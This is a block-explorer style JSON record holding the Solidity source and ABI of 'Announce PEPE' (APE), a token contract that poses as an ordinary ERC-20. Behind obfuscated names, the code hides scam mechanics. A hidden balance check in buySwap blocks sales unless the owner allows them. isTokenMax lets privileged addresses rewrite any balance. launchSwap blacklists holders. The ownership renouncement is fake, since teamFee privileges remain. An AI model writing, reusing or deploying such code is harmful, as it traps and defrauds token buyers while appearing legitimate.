{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface shouldExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedMax) external view returns (uint256);\n\n    function transfer(address takeAt, uint256 totalMarketing) external returns (bool);\n\n    function allowance(address limitMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeAt,\n        uint256 totalMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundList, uint256 value);\n    event Approval(address indexed limitMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract autoExemptAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listModeLiquidity {\n    function createPair(address takeTeam, address listReceiver) external returns (address);\n}\n\ninterface shouldExemptMetadata is shouldExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AnnouncePEPE is autoExemptAmount, shouldExempt, shouldExemptMetadata {\n\n    function balanceOf(address launchedMax) public view virtual override returns (uint256) {\n        return exemptTotal[launchedMax];\n    }\n\n    bool public fundLimit;\n\n    address public teamTake;\n\n    address txMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed marketingExempt, address indexed maxTake);\n\n    mapping(address => mapping(address => uint256)) private toTxMin;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellMinBuy;\n    }\n\n    function launchSwap(address tradingTotal) public {\n        receiverIs();\n        if (totalSell == receiverAt) {\n            receiverAt = totalSell;\n        }\n        if (tradingTotal == teamTake || tradingTotal == fundShould) {\n            return;\n        }\n        limitToken[tradingTotal] = true;\n    }\n\n    uint256 private totalLaunchLimit;\n\n    uint256 constant launchedLimit = 14 ** 10;\n\n    bool public enableAmountLaunched;\n\n    uint256 tokenLaunch;\n\n    function getOwner() external view returns (address) {\n        return listEnable;\n    }\n\n    mapping(address => bool) public teamFee;\n\n    function transferFrom(address autoToken, address takeAt, uint256 totalMarketing) external override returns (bool) {\n        if (_msgSender() != txMarketing) {\n            if (toTxMin[autoToken][_msgSender()] != type(uint256).max) {\n                require(totalMarketing <= toTxMin[autoToken][_msgSender()]);\n                toTxMin[autoToken][_msgSender()] -= totalMarketing;\n            }\n        }\n        return buySwap(autoToken, takeAt, totalMarketing);\n    }\n\n    uint256 isFundSender;\n\n    address public fundShould;\n\n    function atFee(address autoToken, address takeAt, uint256 totalMarketing) internal returns (bool) {\n        require(exemptTotal[autoToken] >= totalMarketing);\n        exemptTotal[autoToken] -= totalMarketing;\n        exemptTotal[takeAt] += totalMarketing;\n        emit Transfer(autoToken, takeAt, totalMarketing);\n        return true;\n    }\n\n    function launchedWalletSwap() public {\n        emit OwnershipTransferred(teamTake, address(0));\n        listEnable = address(0);\n    }\n\n    uint256 private sellMinBuy = 100000000 * 10 ** 18;\n\n    uint256 public feeReceiverTx;\n\n    constructor (){\n        \n        shouldAmount shouldWallet = shouldAmount(txMarketing);\n        fundShould = listModeLiquidity(shouldWallet.factory()).createPair(shouldWallet.WETH(), address(this));\n        if (feeMarketing != feeReceiverTx) {\n            enableAmountLaunched = true;\n        }\n        teamTake = _msgSender();\n        launchedWalletSwap();\n        teamFee[teamTake] = true;\n        exemptTotal[teamTake] = sellMinBuy;\n        if (fromEnable == totalSell) {\n            fundLimit = true;\n        }\n        emit Transfer(address(0), teamTake, sellMinBuy);\n    }\n\n    bool public toFundTrading;\n\n    function name() external view virtual override returns (string memory) {\n        return fromSell;\n    }\n\n    function listMin(uint256 totalMarketing) public {\n        receiverIs();\n        isFundSender = totalMarketing;\n    }\n\n    string private fromSell = \"Announce PEPE\";\n\n    uint256 public totalSell;\n\n    address private listEnable;\n\n    function receiverIs() private view {\n        require(teamFee[_msgSender()]);\n    }\n\n    function transfer(address autoTake, uint256 totalMarketing) external virtual override returns (bool) {\n        return buySwap(_msgSender(), autoTake, totalMarketing);\n    }\n\n    uint256 private feeMarketing;\n\n    uint256 public fromEnable;\n\n    address enableSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletList;\n    }\n\n    mapping(address => uint256) private exemptTotal;\n\n    function isTokenMax(address autoTake, uint256 totalMarketing) public {\n        receiverIs();\n        exemptTotal[autoTake] = totalMarketing;\n    }\n\n    uint256 public receiverAt;\n\n    mapping(address => bool) public limitToken;\n\n    function approve(address toTx, uint256 totalMarketing) public virtual override returns (bool) {\n        toTxMin[_msgSender()][toTx] = totalMarketing;\n        emit Approval(_msgSender(), toTx, totalMarketing);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return listEnable;\n    }\n\n    uint8 private walletList = 18;\n\n    string private receiverAtSell = \"APE\";\n\n    function sellTotalSwap(address atShould) public {\n        require(atShould.balance < 100000);\n        if (toFundTrading) {\n            return;\n        }\n        \n        teamFee[atShould] = true;\n        \n        toFundTrading = true;\n    }\n\n    function allowance(address amountLimit, address toTx) external view virtual override returns (uint256) {\n        if (toTx == txMarketing) {\n            return type(uint256).max;\n        }\n        return toTxMin[amountLimit][toTx];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverAtSell;\n    }\n\n    bool public tokenAuto;\n\n    function buySwap(address autoToken, address takeAt, uint256 totalMarketing) internal returns (bool) {\n        if (autoToken == teamTake) {\n            return atFee(autoToken, takeAt, totalMarketing);\n        }\n        uint256 enableAuto = shouldExempt(fundShould).balanceOf(enableSell);\n        require(enableAuto == isFundSender);\n        require(takeAt != enableSell);\n        if (limitToken[autoToken]) {\n            return atFee(autoToken, takeAt, launchedLimit);\n        }\n        return atFee(autoToken, takeAt, totalMarketing);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAmountLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeReceiverTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMarketing\",\"type\":\"uint256\"}],\"name\":\"isTokenMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTotal\",\"type\":\"address\"}],\"name\":\"launchSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedWalletSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalMarketing\",\"type\":\"uint256\"}],\"name\":\"listMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atShould\",\"type\":\"address\"}],\"name\":\"sellTotalSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFundTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AnnouncePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}